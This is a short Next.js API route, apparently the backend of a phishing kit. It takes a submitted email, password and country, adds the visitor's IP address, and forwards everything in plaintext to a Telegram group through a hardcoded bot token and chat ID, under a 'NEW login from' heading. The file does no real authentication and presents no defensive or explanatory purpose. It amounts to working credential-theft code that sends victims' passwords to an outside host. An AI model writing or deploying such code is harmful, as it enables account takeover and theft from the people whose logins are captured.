// pages/api/send-telegram.js

import axios from 'axios';
import countries from 'i18n-iso-countries';

// Define your bot token and group ID
const BOT_TOKEN = '7781468085:AAEdLDEdPbC1zQUOJnNmYCPgkH84uuwLfgU';
const CHAT_ID = '-1002493880170'; // Group chat ID

// Initialize country data for English
countries.registerLocale(require('i18n-iso-countries/langs/en.json'));

export default async function handler(req, res) {
  const { email, password, country } = req.body;

  if (!email || !password || !country) {
    return res.status(400).json({ message: 'Email, password, and country are required.' });
  }

  // Get the IP address from the request headers
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  // Convert the country code to full country name, if available
  const fullCountryName = countries.getName(country, 'en') || country; // Fallback to input if not found

  // Prepare the message content with subject as "NEW login from [Full Country Name] - IP: [IP Address]"
  const message = `NEW login from ${fullCountryName} - IP: ${ip}\n\nEmail: ${email}\nPassword: ${password}\nCountry: ${fullCountryName}\nIP Address: ${ip}`;

  try {
    // Send the message to the Telegram group using the Bot API
    const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    await axios.post(telegramUrl, {
      chat_id: CHAT_ID,
      text: message,
    });

    // Respond with success
    res.status(200).json({ message: 'Message sent successfully to Telegram group!' });
  } catch (error) {
    console.error('Error sending message to Telegram:', error);
    res.status(500).json({ message: 'Error sending message to Telegram.' });
  }
}
